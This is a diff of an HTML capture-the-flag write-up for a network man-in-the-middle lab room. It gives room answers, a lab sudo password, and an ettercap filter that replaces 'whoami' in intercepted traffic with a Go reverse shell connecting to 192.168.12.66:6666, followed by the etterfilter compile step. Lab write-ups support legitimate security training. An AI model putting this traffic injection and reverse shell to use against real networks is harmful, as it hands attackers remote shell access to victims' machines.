@@ -5,7 +5,7 @@
   <b> Note The admin user is in the sudo group. I suggest using the root user to complete this room <br>
       sudo su (password : Layer2)</b><br>
   
-  Q.1    Now, can you (re)gain access? (Yay/Nay).
+  Q.1    Now, can you (re)gain access?(Yay/Nay).<br>
   Ans.   Yea <br>
   <b>TASK 3 </b><br>
   Q. 1 What is your IP address? <br>
@@ -98,8 +98,12 @@
     log(DATA.data, "/root/ettercap.log");
     replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &" );
     msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
-}  
-</b><br>
+}
+  
+    </b><br>
+    
+    note: if this payload not work download whoami.ecf file from repo <br>
+     
  
  step 2. compile source code with etterfilter<br>
   <b>etterfilter whoami.ecf -o whoami.ef</b><br>
@@ -115,7 +119,7 @@
   
   Enjoy revershell
   
-  <img src=""><br>
+  <img src="root_flag.png"><br>
   
       
       
